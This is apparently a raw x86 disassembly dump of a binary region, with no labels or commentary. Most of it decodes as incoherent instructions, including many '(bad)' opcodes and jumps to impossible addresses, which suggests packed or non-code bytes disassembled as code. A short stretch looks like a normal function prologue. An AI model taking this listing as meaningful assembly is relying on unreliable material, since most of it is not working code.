  403fe5:	inc    edi
  403fe7:	inc    ebp
  403fe8:	enter  0x918b,0xfc
  403fec:	inc    ebp
  403fed:	(bad)  
  403fee:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3961]
  403ff5:	mov    DWORD PTR [esi-0x4],ebx
  403ff8:	rol    DWORD PTR [ebp-0x37],0x8b
  403ffc:	add    al,0xf4
  403ffe:	push   ebp
  403fff:	into   
  404000:	in     al,dx
  404001:	mov    BYTE PTR [ebp-0x3f],0x8b
  404005:	dec    ebp
  404006:	or     BYTE PTR [ebx],bh
  404008:	xor    BYTE PTR [esi+0x1],0x8b
  40400c:	add    ah,ah
  40400e:	add    dh,al
  404010:	in     al,dx
  404011:	(bad)  
  404012:	push   ebx
  404013:	inc    ebp
  404014:	mov    eax,edi
  404016:	adc    al,ch
  404018:	push   ss
  404019:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40401f:	popa   
  404020:	iret   
  404021:	dec    ebp
  404022:	lahf   
  404023:	mov    esi,DWORD PTR [edx]
  404025:	clc    
  404026:	add    ecx,esi
  404028:	cmp    ecx,edi
  40402a:	jne    0x404014
  40402c:	add    DWORD PTR [ebp-0x6f],0x4f08648b
  404033:	or     BYTE PTR [ebx+0x48ae94d],bl
  404039:	or     eax,DWORD PTR [eax]
  40403b:	push   ebp
  40403c:	dec    ebp
  40403d:	jnp    0xd00a4d0c
  404043:	dec    ebp
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	mov    ecx,ebx
  404047:	call   0x340a961f
  40404c:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  404053:	(bad)  
  404054:	cld    
  404055:	sti    
  404056:	lahf   
  404057:	(bad)  
  404058:	mov    ebp,0x8b330055
  40405d:	mov    DWORD PTR [eax],ecx
  40405f:	clc    
  404060:	iret   
  404061:	dec    ebp
  404062:	retf   
  404063:	xor    eax,ecx
  404065:	lea    eax,[eax+ecx*1+0x7204]
  40406c:	dec    ebp
  40406d:	inc    ebp
  40406e:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  404074:	mov    esp,DWORD PTR [ecx+0x14]
  404077:	int    0x6
  404079:	sub    eax,DWORD PTR [ebp+0x3]
  40407c:	(bad)  
  40407d:	lock or BYTE PTR [ebp-0x7b],cl
  404081:	mov    edi,eax
  404083:	in     al,dx
  404084:	cmp    ecx,DWORD PTR [ebp-0x64]
  404087:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40408d:	jne    0x404018
  40408f:	mov    ebx,DWORD PTR [eax]
  404091:	in     al,0x45
  404093:	dec    ebp
  404094:	mov    esi,DWORD PTR [ebx]
  404096:	nop
  404097:	add    eax,DWORD PTR [eax]
  404099:	pop    edi
  40409a:	mov    esi,DWORD PTR [ebx]
  40409c:	mov    DWORD PTR [ebx-0x2c],ebx
  40409f:	ret    0x4d
  4040a2:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  4040a8:	mov    ecx,DWORD PTR [ebp+0x3]
  4040ab:	mov    edi,DWORD PTR [eax+edx*4]
  4040ae:	dec    ebp
  4040af:	add    BYTE PTR [ebx-0x387cf775],cl
  4040b5:	jo     0x40407a
  4040b7:	push   esi
  4040b8:	inc    ebp
  4040b9:	jne    0x404046
  4040bb:	mov    ecx,DWORD PTR [eax]
  4040bd:	push   edi
  4040be:	(bad)  
  4040bf:	pop    ecx
  4040c0:	ret    
  4040c1:	push   ecx
  4040c2:	inc    ebp
  4040c3:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  4040c9:	add    BYTE PTR [ebx+0x45d10ccb],al
  4040cf:	jnp    0x406d4d02
  4040d5:	jg     0x404062
  4040d7:	jmp    0x54:0xde85700c
  4040de:	inc    ebp
  4040df:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  4040e3:	push   ebp
  4040e4:	cmp    BYTE PTR [ebx],dh
  4040e6:	dec    ebp
  4040e7:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  4040ed:	cmp    esp,DWORD PTR [ebx]
  4040ef:	jne    0x40407c
  4040f1:	or     DWORD PTR [ecx+edx*4],0xee036440
  4040f8:	jmp    0x40410f
  4040fa:	mov    ebp,ecx
  4040fc:	push   esp
  4040fd:	add    al,0x45
  4040ff:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  404105:	add    eax,ebx
  404107:	cmp    eax,DWORD PTR [ebp+0xf]
  40410a:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  404111:	sbb    BYTE PTR [ebp+0x45],al
  404114:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40411a:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  404120:	mov    DWORD PTR [ebp+0x14],eax
  404123:	cmp    BYTE PTR [ebp-0x64],al
  404126:	cmp    bh,BYTE PTR [edx-0x7387a64]
  40412c:	adc    al,0x55
  40412e:	test   DWORD PTR [ebx+0x454518f8],ecx
  404134:	cmp    al,0x8b
  404136:	pushf  
  404137:	sbb    BYTE PTR [ebx+0x4d01f080],cl
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ebx],al
  404141:	dec    ebp
  404142:	jnp    0x898d5a09
  404148:	mov    eax,DWORD PTR [ecx]
  40414a:	rol    BYTE PTR [eax],1
  40414c:	iret   
  40414d:	or     DWORD PTR [eax+ecx*2+0xc32899f],ecx
  404154:	cmp    eax,DWORD PTR [ebp+0xf]
  404157:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40415e:	or     BYTE PTR [ebp-0x39],al
  404161:	xor    eax,ebx
  404163:	add    eax,DWORD PTR [ebp-0x77]
  404166:	mov    edx,DWORD PTR [eax+ebx*1]
  404169:	inc    ebp
  40416a:	inc    ebp
  40416b:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  404171:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  404177:	mov    ebp,eax
  404179:	cmp    cl,dh
  40417b:	dec    ebp
  40417c:	dec    DWORD PTR [eax+0x45]
  40417f:	inc    ecx
  404180:	(bad)  
  404181:	mov    esp,eax
  404183:	or     al,0x85
  404185:	sbb    al,bh
  404187:	inc    eax
  404188:	inc    ebp
  404189:	mov    esi,DWORD PTR [ebx]
  40418b:	or     al,0x3
  40418d:	dec    ecx
  40418e:	push   eax
  40418f:	dec    eax
  404190:	inc    ebp
  404191:	rcl    BYTE PTR [eax-0x38],1
  404194:	push   eax
  404195:	inc    ebp
  404196:	dec    DWORD PTR [ebx-0x3e07c775]
  40419c:	rol    BYTE PTR [ebx],0x4e
  40419f:	inc    eax
  4041a0:	inc    ebp
  4041a1:	mov    DWORD PTR [ebx],esi
  4041a3:	sbb    BYTE PTR [ebx],al
  4041a5:	inc    ebp
  4041a6:	push   eax
  4041a7:	xor    esi,DWORD PTR [ebp+0x3]
  4041aa:	lea    ecx,[ecx+0x45e814b8]
  4041b0:	cmc    
  4041b1:	xor    edi,edi
  4041b3:	add    eax,DWORD PTR [ebp-0x77]
  4041b6:	mov    DWORD PTR [eax+eiz*8],edx
  4041b9:	inc    ebp
  4041ba:	inc    ebp
  4041bb:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  4041c1:	ret    
  4041c2:	inc    ebp
  4041c3:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  4041c9:	adc    al,0x8b
  4041cb:	test   DWORD PTR [eax],edx
  4041cd:	clc    
  4041ce:	inc    ecx
  4041cf:	inc    ebp
  4041d0:	mov    edi,DWORD PTR ds:0xc7c89ce0
  4041d6:	push   ss
  4041d7:	adc    al,0x45
  4041d9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4041df:	mov    eax,DWORD PTR [ebx]
  4041e1:	sbb    BYTE PTR [eax],cl
  4041e3:	(bad)  
  4041e4:	dec    ebp
  4041e5:	ret    
  4041e6:	sub    ebp,DWORD PTR [edi+0x8028be9]
  4041ec:	add    BYTE PTR [ebp+0xc],dl
  4041ef:	xor    esi,DWORD PTR [ebp-0x73]
  4041f2:	lea    edx,[ecx]
  4041f4:	lods   al,BYTE PTR ds:[esi]
  4041f5:	jb     0x4041df
  4041f7:	add    ch,dh
  4041f9:	sar    edi,0x83
  4041fc:	cmp    BYTE PTR [ebx],al
  4041fe:	pushf  
  4041ff:	add    BYTE PTR [ecx+0x4533cc45],cl
  404205:	add    edi,DWORD PTR [ebx]
  404207:	mov    DWORD PTR [esp+edx*1+0x3c445c7],ebx
  40420e:	test   esp,ebx
  404210:	clc    
  404211:	inc    ebp
  404212:	inc    ebp
  404213:	(bad)  
  404214:	cmp    eax,0x8d759cf4
  404219:	mov    ecx,esp
  40421b:	or     al,0x4d
  40421d:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  404223:	clc    
  404224:	lea    eax,[ebp-0x3c]
  404227:	xor    BYTE PTR [ebp-0x64],cl
  40422a:	lea    ecx,[ebx-0x38b21f40]
  404230:	mov    eax,ebx
  404232:	or     BYTE PTR [ebp-0x17344731],cl
  404238:	dec    ebp
  404239:	imul   ecx
  40423b:	inc    DWORD PTR [ecx]
  40423d:	inc    ebp
  40423e:	add    BYTE PTR [ebp-0x74638bc6],al
  404244:	pavgb  mm7,mm6
  404247:	mov    DWORD PTR [eax],0xf0ff8bc3
  40424d:	clc    
  40424e:	iret   
  40424f:	inc    ebp
  404250:	lock push eax
  404252:	retf   
  404253:	fmul   QWORD PTR [ebp-0x1]
  404256:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40425c:	test   BYTE PTR [ebx+0x4d32e09f],cl
  404262:	mov    DWORD PTR [ebx],ebp
  404264:	loopne 0x4041ef
  404266:	inc    ebp
  404267:	loopne 0x4041f4
  404269:	inc    ebp
  40426a:	loopne 0x4041f7
  40426c:	xbegin 0x4088335
  404272:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  404279:	jb     0x4042cb
  40427b:	mov    ecx,DWORD PTR [eax+edi*8]
  40427e:	inc    ebp
  40427f:	inc    eax
  404280:	push   eax
  404281:	mov    ebx,DWORD PTR [edi-0x8]
  404284:	inc    DWORD PTR [ecx-0x75]
  404287:	mov    ebp,esp
  404289:	loopne 0x40428b
  40428b:	rol    edi,0xee
  40428e:	test   BYTE PTR [eax],al
  404290:	dec    ebx
  404291:	push   0x32
  404293:	dec    DWORD PTR [ebx-0x30baf70c]
  404299:	push   eax
  40429a:	mov    dh,0x94
  40429c:	add    edi,edi
  40429e:	cmp    edi,DWORD PTR [eax-0x7877af1]
  4042a4:	add    BYTE PTR [ebp-0x75],al
  4042a7:	(bad)  
  4042a8:	call   0xc7c54375
  4042ad:	clc    
  4042ae:	test   BYTE PTR [ebp+0x4b],al
  4042b1:	cmp    dh,BYTE PTR [edx]
  4042b3:	pushf  
  4042b4:	mov    eax,edi
  4042b6:	or     al,al
  4042b8:	iret   
  4042b9:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4042bf:	mov    DWORD PTR [edi],ecx
  4042c1:	in     al,dx
  4042c2:	pop    eax
  4042c3:	dec    ebp
  4042c4:	add    BYTE PTR [ecx+0x4df8e88b],cl
  4042ca:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  4042d0:	dec    ebx
  4042d1:	mov    DWORD PTR [edx],esi
  4042d3:	in     al,0x8b
  4042d5:	dec    ebp
  4042d6:	or     BYTE PTR [ebx],dh
  4042d8:	iret   
  4042d9:	add    esi,DWORD PTR [esi+0x3be00389]
  4042df:	test   DWORD PTR [edi],0x3d3800
  4042e5:	test   DWORD PTR [ebx+0x84e4f8],ecx
  4042eb:	add    edi,eax
  4042ed:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  4042f4:	mov    eax,DWORD PTR [ebx]
  4042f6:	or     BYTE PTR [ecx+0x45b614cf],cl
  4042fc:	add    esi,DWORD PTR [ebx]
  4042fe:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  404304:	add    BYTE PTR [eax],al
  404306:	mov    eax,DWORD PTR [ebp-0x18]
  404309:	mov    eax,DWORD PTR [eax]
  40430b:	lock (bad) 
  40430d:	dec    ebp
  40430e:	test   BYTE PTR [ebx],dh
  404310:	dec    ebx
  404311:	add    esi,DWORD PTR [edx]
  404313:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  404319:	or     bh,cl
  40431b:	(bad)  
  40431c:	mov    ebx,es
  40431e:	dec    ebx
  40431f:	push   0x32
  404321:	lea    esi,[edx]
  404323:	lods   al,BYTE PTR ds:[esi]
  404324:	mov    ebp,eax
  404326:	clc    
  404327:	cli    
  404328:	or     edi,edi
  40432a:	iret   
  40432b:	inc    ebp
  40432c:	mov    WORD PTR [ebx-0x75cdccb5],cs
  404332:	or     al,BYTE PTR ds:0xec728b
  404338:	or     DWORD PTR [ebp-0x31],ecx
  40433b:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  404342:	cmp    al,cl
  404344:	je     0x40451e
  40434a:	mov    eax,DWORD PTR [ebp-0x8]
  40434d:	mov    eax,DWORD PTR [eax]
  40434f:	xor    eax,edi
  404351:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  404358:	mov    ecx,DWORD PTR [ebp-0x18]
  40435b:	xor    ecx,DWORD PTR [ecx]
  40435d:	bswap  edi
  40435f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  404367:	add    DWORD PTR [ebx+0x945e400],ecx
  40436d:	mov    ecx,edi
  40436f:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  404376:	or     al,BYTE PTR [eax]
  404378:	mov    ecx,DWORD PTR [ebp-0x18]
  40437b:	xor    ecx,DWORD PTR [ecx]
  40437d:	bswap  edi
  40437f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  404387:	add    DWORD PTR [edi],ecx
  404389:	add    BYTE PTR [eax-0x7474ffbb],dl
  40438f:	xor    esp,esp
  404391:	mov    al,BYTE PTR [eax]
  404393:	add    eax,0x8472c7
  404398:	dec    ebx
  404399:	dec    ebp
  40439a:	xor    dh,BYTE PTR [ebx]
  40439c:	mov    ecx,DWORD PTR [edi]
  40439e:	clc    
  40439f:	ror    BYTE PTR [ecx],0xcb
  4043a2:	iret   
  4043a3:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  4043ab:	inc    ebp
  4043ac:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  4043b2:	iret   
  4043b3:	add    eax,0x4b728c
  4043b8:	xor    cl,BYTE PTR [ebp+0xa]
  4043bb:	mov    ecx,DWORD PTR [ebx+0x98af833]
  4043c1:	or     eax,0x8c72cf
  4043c6:	dec    edi
  4043c7:	shl    DWORD PTR [edx],0x4d
  4043ca:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4043d0:	in     al,0xd
  4043d2:	add    BYTE PTR [edx-0x39],dh
  4043d5:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4043dc:	mov    esi,DWORD PTR [ebx]
  4043de:	in     al,dx
  4043df:	mov    cl,BYTE PTR [ecx]
  4043e1:	or     eax,0x8c72cf
  4043e6:	dec    ebx
  4043e7:	enter  0x8532,0x32
  4043eb:	add    BYTE PTR [ebx+0x945e800],cl
  4043f1:	mov    ecx,edi
  4043f3:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  4043fa:	or     al,BYTE PTR [eax]
  4043fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4043ff:	mov    ecx,DWORD PTR [ecx]
  404401:	xor    ecx,edi
  404403:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  40440a:	cmp    al,cl
  40440c:	jne    0x40445b
  40440e:	lea    ecx,[ebx-0x7517cc54]
  404414:	cli    
  404415:	or     eax,0x4d72ff
  40441a:	cmp    eax,ecx
  40441c:	je     0x40446b
  40441e:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  404424:	ret    
  404425:	or     eax,0x8b7245
  40442a:	lock enter 0x85c7,0x84
  40442f:	add    BYTE PTR [edi+0x33453200],bl
  404435:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40443b:	add    eax,0x37233
  404440:	cmp    ecx,DWORD PTR [ebp+0xf]
  404443:	mov    esi,edi
  404445:	xor    edi,edi
  404447:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40444d:	add    BYTE PTR [ebx],dh
  40444f:	rol    DWORD PTR [ebx],0x4d
  404452:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  404458:	lock or eax,0x33724d
  40445e:	(bad)  
  40445f:	ror    DWORD PTR [eax],0x4d
  404462:	jb     0x4043ef
  404464:	add    BYTE PTR [ebx],dh
  404466:	ja     0x4043f2
  404468:	sbb    BYTE PTR ds:0x8d7275,cl
  40446e:	xchg   esp,eax
  40446f:	enter  0x50e8,0xf3
  404473:	inc    ebp
  404474:	dec    DWORD PTR [ebx-0x7574ccbb]
  40447a:	loopne 0x404481
  40447c:	(bad)  
  40447d:	jb     0x404442
  40447f:	add    cl,al
  404481:	dec    ebp
  404482:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  404488:	add    ecx,DWORD PTR ds:0x187250
  40448e:	inc    ebp
  40448f:	rcl    DWORD PTR [eax+0x4d],0x4f
  404493:	mov    edi,edi
  404495:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40449b:	jb     0x404426
  40449d:	add    BYTE PTR [ecx+eax*8],dl
  4044a0:	jne    0x4044ef
  4044a2:	dec    DWORD PTR [ebx-0x75baccec]
  4044a8:	add    ecx,DWORD PTR ds:0xe872d8
  4044ae:	repnz enter 0x10ff,0x45
  4044b3:	inc    ebp
  4044b4:	mov    edx,DWORD PTR [eax-0x20]
  4044b7:	mov    ds:0x8bc3ffc7,eax
  4044bc:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  4044c4:	mov    esi,DWORD PTR [ebx]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	add    eax,DWORD PTR [ebp-0x77]
  4044ca:	push   eax
  4044cb:	adc    al,0x15
  4044cd:	inc    ebp
  4044ce:	push   DWORD PTR [ebx]
  4044d0:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  4044d6:	add    DWORD PTR [eax],eax
  4044d8:	mov    eax,edi
  4044da:	test   al,0x4d
  4044dc:	inc    ebp
  4044dd:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  4044e3:	retf   
  4044e4:	mov    edx,ecx
  4044e6:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  4044ed:	inc    ebp
  4044ee:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  4044f4:	xor    eax,ebx
  4044f6:	(bad)  
  4044f7:	enter  0x1111,0x72
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx-0x387de73f],cl
  404502:	cld    
  404503:	test   bh,bh
  404505:	lahf   
  404506:	jne    0x40453a
  404508:	mov    ebp,ebx
  40450a:	fsubr  DWORD PTR [edx+0x6]
  40450d:	dec    DWORD PTR [edx]
  40450f:	hlt    
  404510:	xor    eax,0x7f502d45
  404515:	sbb    ch,ah
  404517:	call   DWORD PTR [edx-0x75]
  40451a:	pop    esi
  40451b:	or     cl,cl
  40451d:	dec    ebp
  40451e:	adc    al,0x33
  404520:	push   ebp
  404521:	add    ebp,esp
  404523:	cmp    esp,esp
  404525:	je     0x4044aa
  404527:	mov    esp,DWORD PTR [eax]
  404529:	or     BYTE PTR [eax],bh
  40452b:	(bad)  
  40452c:	pushf  
  40452d:	ret    
  40452e:	mov    DWORD PTR [edx+0x24],ebp
  404531:	lea    ecx,[ebp+0x44e80394]
  404537:	clc    
  404538:	or     al,0xff
  40453a:	push   esp
  40453b:	inc    ebp
  40453c:	or     BYTE PTR [ebx+0x450818be],al
  404542:	pop    es
  404543:	call   esi
  404545:	test   al,0xbf
  404547:	jne    0x4045bb
  404549:	mov    eax,DWORD PTR [eax]
  40454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454c:	xlat   BYTE PTR ds:[ebx]
  40454d:	inc    ebp
  40454e:	push   esp
  40454f:	push   eax
  404550:	or     al,0xde
  404552:	push   ebp
  404553:	dec    DWORD PTR [ecx-0x74f7db75]
  404559:	dec    ebp
  40455a:	adc    BYTE PTR [ebx],dh
  40455c:	rol    DWORD PTR [ebx],1
  40455e:	sbb    BYTE PTR [ebx],bh
  404560:	dec    esp
  404561:	je     0x404577
  404563:	push   0x54
  404565:	call   DWORD PTR [eax]
  404567:	test   al,0xce
  404569:	inc    ebp
  40456a:	iret   
  40456b:	add    ebp,DWORD PTR [edi+0x24e889d8]
  404571:	clc    
  404572:	jmp    0x854776
  404577:	mov    edx,eax
  404579:	test   al,0x1f
  40457b:	or     BYTE PTR [ebp+eax*2+0x10],al
  40457f:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  404583:	inc    ebp
  404584:	(bad)  
  404585:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9f]
  40458c:	mov    DWORD PTR [ebx],eax
  40458e:	and    al,0xf
  404590:	push   0xf84d85c1
  404595:	mov    edi,ebp
  404597:	rol    BYTE PTR [eax],1
  404599:	iret   
  40459a:	or     DWORD PTR [edx+edi*1+0x75329c9f],0x850f683b
  4045a5:	push   edi
  4045a6:	clc    
  4045a7:	(bad)  
  4045a8:	jmp    0x404535
  4045aa:	add    BYTE PTR [eax],dl
  4045ac:	mov    eax,0xf8898545
  4045b1:	jmp    0x404583
  4045b3:	add    DWORD PTR [ebp+0x640091],0x206544be
  4045bd:	pop    edi
  4045be:	inc    esp
  4045bf:	pop    ebx
  4045c0:	sbb    dl,al
  4045c2:	inc    ebp
  4045c3:	add    BYTE PTR [ecx-0x747cdb75],cl
  4045c9:	clc    
  4045ca:	and    al,0xec
  4045cc:	mov    DWORD PTR [ecx-0x7747adc],edi
  4045d2:	and    al,0x4c
  4045d4:	mov    DWORD PTR [eax],ecx
  4045d6:	and    al,0x41
  4045d8:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  4045de:	and    al,0x24
  4045e0:	xor    edx,DWORD PTR [esi+0x3]
  4045e3:	pop    ecx
  4045e4:	mov    DWORD PTR [ecx-0x75],edx
  4045e7:	xor    esp,DWORD PTR [edi+edx*2]
  4045ea:	mov    ebx,DWORD PTR [edi+0x3003294]
  4045f0:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  4045f6:	mov    ecx,DWORD PTR [esp+edx*4]
  4045f9:	push   esp
  4045fa:	add    BYTE PTR [eax],ah
  4045fc:	mov    edx,DWORD PTR [ebp+0x3]
  4045ff:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  404606:	mov    DWORD PTR [ebx+0x33002401],ecx
  40460c:	dec    ecx
  40460d:	add    ebp,DWORD PTR [edx+0xf]
  404610:	push   0x4c30ca
  404615:	adc    BYTE PTR [eax+0x1f],dh
  404618:	push   0x0
  40461a:	(bad)  
  40461b:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  404621:	and    al,0x24
  404623:	mov    esi,DWORD PTR [ebx]
  404625:	and    al,0x3
  404627:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40462d:	jb     0x404653
  40462f:	add    bh,bh
  404631:	inc    esp
  404632:	and    al,0x14
  404634:	lea    edi,[edx]
  404636:	and    al,0x9c
  404638:	push   eax
  404639:	jmp    0x544682
  40463e:	(bad)  
  40463f:	cli    
  404640:	and    al,0x85
  404642:	(bad)  
  404643:	clc    
  404644:	and    al,0xa
  404646:	call   0xffdd3f88
  40464b:	jmp    0x544694
  404650:	dec    esp
  404651:	ds or  al,0x9c
  404654:	(bad)  
  404655:	cmp    eax,edi
  404657:	bswap  eax
  404659:	mov    bh,0x4b
  40465b:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40465f:	and    al,0x4c
  404661:	mov    DWORD PTR [esp],ebx
  404664:	(bad)  
  404665:	mov    eax,edi
  404667:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40466d:	inc    esp
  40466e:	jmp    0x404684
  404670:	add    DWORD PTR [ebp+edi*1+0x20],0x1075449c
  404678:	push   0xf8148544
  40467d:	inc    esp
  40467e:	sbb    BYTE PTR [edx+edi*8],dl
  404681:	dec    esp
  404682:	test   DWORD PTR [eax+edi*8],ebx
  404685:	mov    BYTE PTR [edi],0xc7
  404688:	aas    
  404689:	add    DWORD PTR [esp+eax*2-0x7f7ee715],ebx
  404690:	aas    
  404691:	add    DWORD PTR [eax+eax*1+0x44500875],ebx
  404698:	jne    0x4046b2
  40469a:	inc    DWORD PTR [eax+0xfa01f8]
  4046a0:	clc    
  4046a1:	add    bh,bh
  4046a3:	inc    ecx
  4046a4:	jne    0x404631
  4046a6:	call   0xffcc44cf
  4046ab:	fadd   DWORD PTR [eax+eax*1+0xc]
  4046af:	mov    eax,DWORD PTR [esp+edx*1+0xc]
  4046b3:	add    al,0x5e
  4046b5:	add    ch,ah
  4046b7:	add    dl,al
  4046b9:	inc    DWORD PTR [eax]
  4046bb:	push   eax
  4046bc:	and    al,0x0
  4046be:	rol    DWORD PTR ss:[ebp-0x63f3f8bc],1
  4046c5:	inc    esp
  4046c6:	adc    DWORD PTR [esp+ebx*4],0x9c768c6
  4046cd:	inc    esp
  4046ce:	adc    BYTE PTR [eax+ecx*1],ah
  4046d1:	inc    esp
  4046d2:	call   FWORD PTR [esp]
  4046d5:	je     0x4046fb
  4046d7:	sbb    BYTE PTR [ebx-0x74d7f3bc],cl
  4046dd:	lea    ecx,[ebx+0x3b503324]
  4046e3:	je     0x404670
  4046e5:	sub    al,0x8b
  4046e7:	je     0x40471c
  4046e9:	and    al,0xf
  4046eb:	mov    bl,0x1
  4046ed:	(bad)  
  4046ee:	clc    
  4046ef:	and    al,0xeb
  4046f1:	and    al,0x75
  4046f3:	add    eax,DWORD PTR [ebp-0x74db818c]
  4046f9:	and    al,0x5d
  4046fb:	add    eax,DWORD PTR [edx+edi*8+0x3c]
  4046ff:	cmp    al,0x85
  404701:	or     al,0x89
  404703:	pop    edi
  404704:	push   ebp
  404705:	mov    ebp,esp
  404707:	sub    esp,0x78
  40470a:	xor    eax,DWORD PTR ds:0x412370
  404710:	mov    eax,ds:0x40d5d0
  404715:	mov    DWORD PTR [ebp-0x10],eax
  404718:	mov    eax,ds:0x40d6dc
  40471d:	or     DWORD PTR ds:0x417e59,0x49bb
  404727:	mov    DWORD PTR [ebp-0x30],eax
  40472a:	mov    DWORD PTR [ebp-0xc],0xf89c8538
  404731:	mov    eax,ds:0x412368
  404736:	and    DWORD PTR ds:0x41abde,eax
  40473c:	mov    DWORD PTR [ebp-0x14],0xf89c853b
  404743:	mov    eax,DWORD PTR [ebp-0xc]
  404746:	xor    DWORD PTR ds:0x4245be,0x412378
  404750:	push   ebx
  404751:	push   esi
  404752:	and    DWORD PTR ds:0x417e55,0x7bf9
  40475c:	push   edi
  40475d:	mov    esi,0x7510859
  404762:	xor    eax,esi
  404764:	add    DWORD PTR ds:0x4245c6,0x4e22
  40476e:	mov    edi,0x32729f
  404773:	or     DWORD PTR ds:0x4245c6,0x5629
  40477d:	add    eax,edi
  40477f:	mov    DWORD PTR [ebp-0x20],eax
  404782:	movzx  eax,WORD PTR ds:0x412370
  404789:	and    DWORD PTR ds:0x415111,eax
  40478f:	mov    DWORD PTR [ebp-0x28],0xf89cb538
  404796:	dec    eax
  404797:	mov    DWORD PTR [ebp-0x34],0xf89f0538
  40479e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f8
  4047a5:	add    DWORD PTR ds:0x41abd2,edx
  4047ab:	jmp    0x404924
  4047b0:	xlat   BYTE PTR ds:[ebx]
  4047b1:	mov    dl,0x2
  4047b3:	and    edi,DWORD PTR [ebx-0x5fa5289d]
  4047b9:	mov    al,ds:0xc9bc87ea
  4047be:	test   al,0x49
  4047c0:	jle    0x404840
  4047c2:	jle    0x404842
  4047c4:	fidivr DWORD PTR [edi+0x7e]
  4047c7:	jle    0x404797
  4047c9:	(bad)  
  4047ca:	cmp    eax,0xcfdb31c5
  4047cf:	fld    st(2)
  4047d1:	ja     0x404847
  4047d3:	or     eax,DWORD PTR [ebx]
  4047d5:	push   edx
  4047d6:	or     BYTE PTR [edi],cl
  4047d8:	cmp    ecx,DWORD PTR [edi]
  4047da:	enter  0x3710,0x18
  4047de:	pop    ds
  4047df:	mov    cl,0x50
  4047e1:	or     BYTE PTR [edi-0x4210f123],ah
  4047e7:	rol    esi,cl
  4047e9:	or     ecx,DWORD PTR [esi-0x551b41ea]
  4047ef:	dec    ecx
  4047f0:	add    eax,0x1fb6dead
  4047f5:	push   esi
  4047f6:	in     al,dx
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	add    ebx,DWORD PTR [ecx]
  4047fa:	pushf  
  4047fb:	jo     0x4047c3
  4047fd:	dec    eax
  4047fe:	mov    ds:0x34d92d5b,al
  404803:	cmp    al,0xad
  404805:	xor    BYTE PTR [ebx+0x35],0xa3
  404809:	jbe    0x40483f
  40480b:	fisttp DWORD PTR [ecx+0x3198c6f1]
  404811:	jecxz  0x40484b
  404813:	and    ecx,0x4f
  404816:	(bad)  
  404817:	xchg   esi,eax
  404818:	dec    ecx
  404819:	inc    DWORD PTR [edi-0x2d5e8870]
  40481f:	mov    ebp,0x4526ed4d
  404824:	sub    edi,DWORD PTR [edx-0x4361911e]
  40482a:	jae    0x404845
  40482c:	retf   
  40482d:	call   0xd4ca:0x5ee3c429
  404834:	mov    al,0xf8
  404836:	loop   0x4047d2
  404838:	cmp    edi,ecx
  40483a:	fs push ebp
  40483c:	(bad)  
  40483d:	sub    ch,cl
  40483f:	or     dl,cl
  404841:	sbb    DWORD PTR [ecx-0x6a],ebx
  404844:	and    eax,0x70696f0b
  404849:	add    BYTE PTR [ecx],bh
